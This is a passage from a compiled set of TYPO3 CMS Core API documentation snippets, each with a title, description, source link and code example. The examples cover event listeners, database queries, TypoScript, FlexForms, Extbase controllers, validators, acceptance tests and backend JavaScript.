composer.json file, allowing Composer to find and install extensions from the packages directory during development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/CreateNewExtension.rst#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"repositories\": [\n      {\n         \"type\": \"path\",\n         \"url\": \"packages/*\"\n      }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Configuration in PHP\nDESCRIPTION: Code example showing how to access custom site configuration values using the TYPO3 Site API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ExtendingSiteConfig.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$site->getConfiguration()['myProject']['recordStorage']\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Event Listener for TYPO3 Redirect Hit Count\nDESCRIPTION: Example implementation of an event listener that checks if a request comes from a monitoring tool and disables the hit count increment for the redirect record accordingly. The listener runs before the default hit count increment listener.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/RedirectWasHitEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Redirects\\Event\\RedirectWasHitEvent;\n\n#[AsEventListener(\n    identifier: 'my-extension/disable-hit-count-for-monitoring-tools',\n    before: 'redirects-increment-hit-count'\n)]\nfinal class MyEventListener\n{\n    public function __invoke(RedirectWasHitEvent $event): void\n    {\n        $request = $event->getRequest();\n        if ($this->isMonitoringTool($request)) {\n            $record = $event->getRecord();\n            $record['disable_hitcount'] = true;\n            $event->setRecord($record);\n        }\n    }\n\n    private function isMonitoringTool(ServerRequestInterface $request): bool\n    {\n        // Add your logic here\n        return false;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::leftPad() in TYPO3 Repository (PHP)\nDESCRIPTION: Illustrates the usage of the leftPad() function in a TYPO3 repository to pad a value with a specified character to a certain length. It uses QueryBuilder to create a SELECT statement with the padded value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findPaddedValues(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->leftPad(\n                'some_field',\n                10,\n                ' '\n            ),\n            'padded_value'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: Using Backend Login in TYPO3 Acceptance Tests\nDESCRIPTION: PHP code demonstrating how to use the backend login helper in a TYPO3 acceptance test case.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/AcceptanceTesting/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\npublic function styleguideCanBeShown(\\TYPO3\\TestingFramework\\Core\\Acceptance\\Step\\Backend\\Admin $I)\n{\n    $I->useExistingSession('admin');\n    $I->click('Admin tools', '#typo3-menu');\n    $I->click('Styleguide', '//li[@id=\"more-styled-module\"]');\n    $I->switchToContentFrame();\n    $I->see('TYPO3 CMS Backend Styleguide', 'h1');\n}\n```\n\n----------------------------------------\n\nTITLE: ModifyRecordsAfterFetchingContentEvent Usage Example\nDESCRIPTION: Example implementation of an event listener for ModifyRecordsAfterFetchingContentEvent in TYPO3 CMS. This event allows modification of fetched records and content processing options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyRecordsAfterFetchingContentEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\ModifyRecordsAfterFetchingContentEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyRecordsAfterFetchingContentEvent $event): void\n    {\n        // Get records\n        $records = $event->getRecords();\n\n        // Modify records\n        foreach ($records as &$record) {\n            $record['header'] = 'Modified: ' . $record['header'];\n        }\n\n        // Set modified records\n        $event->setRecords($records);\n\n        // Example: Disable sliding of content\n        $configuration = $event->getConfiguration();\n        $configuration['slide'] = false;\n        $event->setConfiguration($configuration);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Command Execution with DataHandler (PHP)\nDESCRIPTION: Shows basic command execution using DataHandler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start([], $cmd);\\n$dataHandler->process_cmdmap();\n```\n\n----------------------------------------\n\nTITLE: Configuring Meta Tags with TypoScript in TYPO3\nDESCRIPTION: Demonstrates how to set and replace meta tags using TypoScript configuration in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_6\n\nLANGUAGE: TypoScript\nCODE:\n```\npage.meta {\n    og:site_name = TYPO3\n    og:site_name.attribute = property\n    og:site_name.replace = 1\n}\n```\n\n----------------------------------------\n\nTITLE: Extbase BlogController Update Action\nDESCRIPTION: This snippet showcases an update action in an Extbase BlogController. It illustrates how to redirect to another action using `$this->redirect('another')`.  It also implicitly demonstrates the use of dependency injection for the BlogRepository.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace Vendor\\Extension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\nuse Vendor\\Extension\\Domain\\Repository\\BlogRepository;\n\nclass BlogController extends ActionController\n{\n    /**\n     * blogRepository\n     *\n     * @var BlogRepository\n     */\n    protected $blogRepository = null;\n\n    /**\n     * action update\n     *\n     * @param Vendor\\Extension\\Domain\\Model\\Blog $blog\n     * @return ResponseInterface\n     */\n    public function updateAction(Vendor\\Extension\\Domain\\Model\\Blog $blog): ResponseInterface\n    {\n        $this->blogRepository->update($blog);\n        $this->addFlashMessage('The object was updated.', '', \\TYPO3\\CMS\\Core\\Messaging\\AbstractMessage::INFO);\n        return $this->redirect('list');\n    }\n\n    /**\n     * @param BlogRepository $blogRepository\n     */\n    public function injectBlogRepository(BlogRepository $blogRepository)\n    {\n        $this->blogRepository = $blogRepository;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Database Connections in TYPO3 PHP\nDESCRIPTION: This snippet shows how to configure two database connections in TYPO3's settings.php file. It includes a default connection and a separate 'Sessions' connection, with table mapping for the 'be_sessions' table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Configuration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'DB' => [\n    'Connections' => [\n        'Default' => [\n            'charset' => 'utf8',\n            'dbname' => 'default_dbname',\n            'driver' => 'mysqli',\n            'host' => 'default_host',\n            'password' => '***',\n            'port' => 3306,\n            'user' => 'default_user',\n        ],\n        'Sessions' => [\n            'charset' => 'utf8mb4',\n            'driver' => 'mysqli',\n            'dbname' => 'sessions_dbname',\n            'host' => 'sessions_host',\n            'password' => '***',\n            'port' => 3306,\n            'user' => 'some_user',\n        ],\n    ],\n    'TableMapping' => [\n        'be_sessions' => 'Sessions',\n    ]\n],\n```\n\n----------------------------------------\n\nTITLE: Accessing User Configuration in TYPO3\nDESCRIPTION: Retrieves user configuration settings that are managed by the User Settings module, specifically the 'emailMeAtLogin' preference.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->uc['emailMeAtLogin']\n```\n\n----------------------------------------\n\nTITLE: Using additionalAttributes with data attributes in Fluid ViewHelpers\nDESCRIPTION: This example demonstrates how to use the additionalAttributes property to add custom data attributes to a form textbox input. The property accepts an array of attribute name-value pairs that will be rendered as HTML attributes on the resulting tag.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/AdditionalAttributes.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:form.textbox additionalAttributes=\"{data-anything: 'some info', data-something: some.variable}\" />\n```\n\n----------------------------------------\n\nTITLE: Checking Page Access in TYPO3\nDESCRIPTION: Verifies if a user has read access to a specific page. Change the permission parameter to check edit (2) or delete (4) permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->doesUserHaveAccess($pageRec, 1);\n```\n\n----------------------------------------\n\nTITLE: Searching Files in TYPO3 Folder using FAL - PHP\nDESCRIPTION: Example of searching for files within a specific folder using TYPO3's File Abstraction Layer. The code demonstrates how to create a FileSearchDemand object and use it with a folder's file objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileSearch.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n_ExamplesFileSearch/_SearchInFolder.php\n```\n\n----------------------------------------\n\nTITLE: Accessing ModifyVersionDifferencesEvent in TYPO3\nDESCRIPTION: Example of implementing an event listener for ModifyVersionDifferencesEvent to modify version differences data in TYPO3 Workspaces. The event provides access to version differences through getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/ModifyVersionDifferencesEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Workspaces\\Event\\ModifyVersionDifferencesEvent\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyAutoCreateRedirectRecordBeforePersistingEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the ModifyAutoCreateRedirectRecordBeforePersistingEvent in TYPO3. It shows how to modify the redirect record based on specific conditions before it is persisted to the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/ModifyAutoCreateRedirectRecordBeforePersistingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Redirects\\Event\\ModifyAutoCreateRedirectRecordBeforePersistingEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyAutoCreateRedirectRecordBeforePersistingEvent $event): void\n    {\n        $redirectRecord = $event->getRedirectRecord();\n\n        // Modify the redirect record based on specific conditions\n        if ($redirectRecord['source_host'] === 'www.example.com') {\n            $redirectRecord['target'] = 'https://www.example.com/new-target';\n            $redirectRecord['disabled'] = true;\n        }\n\n        $event->setRedirectRecord($redirectRecord);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Data Processor in TypoScript for TYPO3\nDESCRIPTION: This snippet demonstrates how to configure a custom data processor in TypoScript for a new custom content element. It specifies the processor class, configuration options, and output variable name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomDataProcessing.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\ntt_content.examples_dataproccustom =< lib.contentElement\ntt_content.examples_dataproccustom {\n    templateName = CustomCategory\n    dataProcessing {\n        10 = T3docs\\Examples\\DataProcessing\\CustomCategoryProcessor\n        10 {\n            // field name in the database\n            categoryList.field = categories\n            as = customCategories\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring RSS Feed Plugin for TYPO3 CMS Extension\nDESCRIPTION: This snippet configures a plugin for an RSS feed in a TYPO3 CMS extension. It uses the ExtensionUtility class to register the 'PostListRss' plugin for the 'blog_post' extension, mapping it to the 'displayRssList' action of the PostController.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/FrontendPlugins/ConfigureRssPlugin.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\nuse FriendsOfTYPO3\\BlogExample\\Controller\\PostController;\n\n// RSS Feed\nExtensionUtility::configurePlugin(\n   'blog_post',\n   'PostListRss',\n   [PostController::class => 'displayRssList']\n);\n```\n\n----------------------------------------\n\nTITLE: Sending Broadcast Messages in TYPO3 Backend\nDESCRIPTION: Example code showing how to import and use the broadcast service to send messages from a JavaScript module. The message contains the component name, event name, and additional payload data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BroadcastChannels.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport BroadcastService from '@typo3/backend/broadcast-service.js';\n\n// Demonstrate sending a message, \"my_extension\" is the component name, \"my_event\" is the event name\n// The event name to listen to would be \"typo3:my_extension:my_event\"\nBroadcastService.post({\n  componentName: 'my_extension',\n  eventName: 'my_event',\n  greeting: 'Hello World',\n  anotherProperty: 'foobar'\n});\n\n```\n\n----------------------------------------\n\nTITLE: Generating TYPO3 Encryption Key via PHP API\nDESCRIPTION: Shows how to generate a random 96-character hexadecimal encryption key programmatically using TYPO3's Random utility class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/InstallTool.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse \\TYPO3\\CMS\\Core\\Crypto\\Random;\nuse \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$encryptionKey = GeneralUtility::makeInstance(Random::class)->generateRandomHexString(96);\n```\n\n----------------------------------------\n\nTITLE: Reading FlexForm Settings in Extbase Controller\nDESCRIPTION: Shows how to access FlexForm settings using $this->settings in an Extbase controller action. The example demonstrates reading a boolean value with a fallback.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$includeCategories = (bool) ($this->settings['includeCategories'] ?? false);\n```\n\n----------------------------------------\n\nTITLE: Extending Debug Exception Handler in TYPO3 CMS\nDESCRIPTION: This code snippet shows an example of extending the built-in DebugExceptionHandler in TYPO3 CMS. It overrides the echoExceptionWeb method to add custom functionality (posting exceptions on Twitter) while still utilizing the core exception handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Extending/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace Vendor\\SomeExtension\\Error;\n\nclass PostExceptionsOnTwitter extends \\TYPO3\\CMS\\Core\\Error\\DebugExceptionHandler\n{\n    public function echoExceptionWeb(Exception $exception)\n    {\n        $this->postExceptionsOnTwitter($exception);\n    }\n\n    public function postExceptionsOnTwitter($exception)\n    {\n        // do it ;-)\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Object Validator in Extbase Domain Model\nDESCRIPTION: A custom validator for performing complete validation of a domain model before persistence, checking multiple properties and adding property-specific errors\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nclass MyObjectValidator extends AbstractValidator {\n    protected function isValid($object) {\n        if (!/* overall validation condition */) {\n            $this->addErrorForProperty(\n                'propertyName',\n                'Specific property error message'\n            );\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Validating a Blog Model with Extbase Validator\nDESCRIPTION: This code snippet demonstrates a custom validator class, BlogValidator, in a TYPO3 Extbase extension. It validates instances of the Blog model, checking the validity of blog category count and subtitle. It uses the LocalizationUtility to translate error messages and the BlogValidationService to encapsulate the actual validation logic.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/_ObjectValidator.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3\\CMS\\Extbase\\Utility\\LocalizationUtility;\n\nfinal class BlogValidator extends AbstractValidator\n{\n    protected function isValid(mixed $value): void\n    {\n        if (!$value instanceof Blog) {\n            $errorString = 'The blog validator can only handle classes '\n                . 'of type T3docs\\\\BlogExample\\\\Domain\\\\Validator\\\\Blog. '\n                . $value::class . ' given instead.';\n            $this->addError($errorString, 1297418975);\n        }\n        if (!$this->blogValidationService->isBlogCategoryCountValid($value)) {\n            $errorString = LocalizationUtility::translate(\n                'error.Blog.tooManyCategories',\n                'BlogExample',\n            );\n            // Add the error to the property if it is specific to one property\n            $this->addErrorForProperty('categories', $errorString, 1297418976);\n        }\n        if (!$this->blogValidationService->isBlogSubtitleValid($value)) {\n            $errorString = LocalizationUtility::translate(\n                'error.Blog.invalidSubTitle',\n                'BlogExample',\n            );\n            // Add the error directly if it takes several properties into account\n            $this->addError($errorString, 1297418974);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting a Row from tt_content Table in TYPO3\nDESCRIPTION: Demonstrates how to delete a single record from the tt_content table using a simple WHERE condition with the uid field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/BasicCrud/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nDELETE FROM `tt_content` WHERE `uid` = '4711'\n```\n\n----------------------------------------\n\nTITLE: Generating HTML Response with TYPO3 Extbase\nDESCRIPTION: This snippet demonstrates how to set variables on the view and return an HTML response using TYPO3 Extbase. The method htmlResponse() leverages Fluid templates to configure the rendering. Dependencies include a properly configured Fluid template setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/View/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\include:: /CodeSnippets/Extbase/View/HtmlResponse.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Creating a FlexForm Configuration Schema in XML for a Haiku List Plugin\nDESCRIPTION: Example of a FlexForm configuration schema that defines settings for a Haiku List plugin, including fields for limiting the number of items and selecting the template variant.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<T3DataStructure>\n    <sheets>\n        <sDEF>\n            <root>\n                <sheetTitle>LLL:EXT:frontend/Resources/Private/Language/locallang_ttc.xlf:tabs.plugin</sheetTitle>\n                <type>array</type>\n                <el>\n                    <settings.maxItems>\n                        <label>Max. items</label>\n                        <config>\n                            <type>input</type>\n                            <size>4</size>\n                            <eval>int</eval>\n                            <default>10</default>\n                            <range>\n                                <lower>1</lower>\n                                <upper>100</upper>\n                            </range>\n                        </config>\n                    </settings.maxItems>\n                    <settings.templateVariant>\n                        <label>Template variant</label>\n                        <config>\n                            <type>select</type>\n                            <renderType>selectSingle</renderType>\n                            <items>\n                                <numIndex index=\"0\">\n                                    <label>Default</label>\n                                    <value>default</value>\n                                </numIndex>\n                                <numIndex index=\"1\">\n                                    <label>Centered</label>\n                                    <value>centered</value>\n                                </numIndex>\n                                <numIndex index=\"2\">\n                                    <label>With images</label>\n                                    <value>images</value>\n                                </numIndex>\n                            </items>\n                        </config>\n                    </settings.templateVariant>\n                </el>\n            </root>\n        </sDEF>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: JavaScript file for SHA256 hash example\nDESCRIPTION: Example JavaScript file content used to demonstrate SHA256 hashing for Content Security Policy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log('Hello.');\n```\n\n----------------------------------------\n\nTITLE: Injecting EventDispatcher in TYPO3 PHP Class\nDESCRIPTION: Demonstrates how to inject the EventDispatcher into a TYPO3 class using dependency injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension;\n\nuse Psr\\EventDispatcher\\EventDispatcherInterface;\n\nclass SomeClass\n{\n    public function __construct(\n        private readonly EventDispatcherInterface $eventDispatcher\n    ) {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Readonly Value Object Declaration in PHP\nDESCRIPTION: This code snippet demonstrates the creation of a readonly value object in PHP using public constructor property promotion.  The `final readonly` declaration, combined with public properties in the constructor, simplifies the creation of immutable data objects, ensuring that their values cannot be changed after instantiation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Readonly.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n \":caption: Read only value object using public constructor property promotion\n\n    final readonly class Label\n    {\n        public function __construct(\n            public string $label,\n            public string $color = '#ff8700',\n            public int $priority = 0,\n        ) {}\n    }\"\n```\n\n----------------------------------------\n\nTITLE: Handling Backend Frames in TYPO3 Acceptance Tests\nDESCRIPTION: PHP code showing how to use the FrameSteps trait to handle backend frames in TYPO3 acceptance tests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/AcceptanceTesting/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse \\TYPO3\\TestingFramework\\Core\\Acceptance\\Step\\Backend\\Admin;\nuse TYPO3\\TestingFramework\\Core\\Acceptance\\Support\\BackendTester;\n\nclass SomeCest\n{\n    /**\n     * @param BackendTester $I\n     */\n    public function _before(BackendTester $I)\n    {\n        $I->useExistingSession('admin');\n    }\n\n    /**\n     * @param Admin $I\n     */\n    public function someTest(Admin $I)\n    {\n        $I->switchToMainFrame();\n        $I->click('Admin tools', '#typo3-menu');\n        $I->switchToContentFrame();\n        $I->see('some content');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Styleguide Functional Test for TCA Data Generator\nDESCRIPTION: A functional test that verifies the TCA data generator creates database records properly. The test sets up a backend user, initializes the language object, and checks if records are created in the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Styleguide\\Tests\\Functional\\TcaDataGenerator;\n\nuse TYPO3\\CMS\\Core\\Core\\Bootstrap;\nuse TYPO3\\CMS\\Styleguide\\TcaDataGenerator\\Generator;\nuse TYPO3\\TestingFramework\\Core\\Functional\\FunctionalTestCase;\n\n/**\n * Test case\n */\nclass GeneratorTest extends FunctionalTestCase\n{\n    /**\n     * @var array Have styleguide loaded\n     */\n    protected $testExtensionsToLoad = [\n        'typo3conf/ext/styleguide',\n    ];\n\n    /**\n     * Just a dummy to show that at least one test is actually executed on mssql\n     *\n     * @test\n     */\n    public function dummy()\n    {\n        $this->assertTrue(true);\n    }\n\n    /**\n     * @test\n     * @group not-mssql\n     * @todo Generator does not work using mssql DMBS yet ... fix this\n     */\n    public function generatorCreatesBasicRecord()\n    {\n        // styleguide generator uses DataHandler for some parts. DataHandler needs an\n        // initialized BE user with admin right and the live workspace.\n        Bootstrap::initializeBackendUser();\n        $GLOBALS['BE_USER']->user['admin'] = 1;\n        $GLOBALS['BE_USER']->user['uid'] = 1;\n        $GLOBALS['BE_USER']->workspace = 0;\n        Bootstrap::initializeLanguageObject();\n\n        // Verify there is no tx_styleguide_elements_basic yet\n        $queryBuilder = $this->getConnectionPool()->getQueryBuilderForTable('tx_styleguide_elements_basic');\n        $queryBuilder->getRestrictions()->removeAll();\n        $count = (int)$queryBuilder->count('uid')\n            ->from('tx_styleguide_elements_basic')\n            ->executeQuery()\n            ->fetchOne();\n        $this->assertEquals(0, $count);\n\n        $generator = new Generator();\n        $generator->create();\n\n        // Verify there is at least one tx_styleguide_elements_basic record now\n        $queryBuilder = $this->getConnectionPool()->getQueryBuilderForTable('tx_styleguide_elements_basic');\n        $queryBuilder->getRestrictions()->removeAll();\n        $count = (int)$queryBuilder->count('uid')\n            ->from('tx_styleguide_elements_basic')\n            ->executeQuery()\n            ->fetchOne();\n        $this->assertGreaterThan(0, $count);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Throttled Event Handler in TYPO3 JavaScript\nDESCRIPTION: Creates a throttled event listener for the mousewheel event that executes every 50ms during the event's duration. The ThrottleEvent constructor takes the event name, callback function, and time limit in milliseconds as parameters, then binds the listener to the document body.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/ThrottleEvent/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport ThrottleEvent from '@typo3/core/event/throttle-event.js';\n\nnew ThrottleEvent('mousewheel', function (e) {\n    console.log('Executed every 50ms during the overall event time span');\n}, 50).bindTo(document.body);\n```\n\n----------------------------------------\n\nTITLE: Loading YAML Files with YamlFileLoader in PHP\nDESCRIPTION: Demonstrates how to use the YamlFileLoader class to load YAML files in TYPO3 extensions. The loader can process placeholders and imports based on specified flags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Configuration\\Loader\\YamlFileLoader;\n\n// ...\n\n(new YamlFileLoader())\n    ->load(string $fileName, int $flags = self::PROCESS_PLACEHOLDERS | self::PROCESS_IMPORTS)\n```\n\n----------------------------------------\n\nTITLE: Configuring FileWriter for ERROR level logs in TYPO3\nDESCRIPTION: This snippet demonstrates how to configure a FileWriter for ERROR level log entries in TYPO3. It sets up a log file in the var/log directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['writerConfiguration'] = [\n    // Configuration for ERROR level log entries\n    \\Psr\\Log\\LogLevel::ERROR => [\n        // Add a FileWriter\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class => [\n            // Configuration for the writer\n            'logFile' => \\TYPO3\\CMS\\Core\\Core\\Environment::getVarPath() . '/log/typo3_7ac500bce5.log'\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Modal Window in TYPO3 JavaScript\nDESCRIPTION: Shows how to create a simple modal window with just a title and content using the TYPO3 Modal API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nTYPO3.Modal.confirm('The title of the modal', 'This the the body of the modal');\n```\n\n----------------------------------------\n\nTITLE: Using Processed Files in a Carousel Template\nDESCRIPTION: Fluid template that iterates through file references processed by the FilesProcessor and renders each as an image in a carousel slide.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<f:for each=\"{images}\" as=\"image\">\n    <div class=\"slide\">\n        <f:image image=\"{image.originalFile}\" />\n    </div>\n</f:for>\n```\n\n----------------------------------------\n\nTITLE: Service Configuration with Public Access in 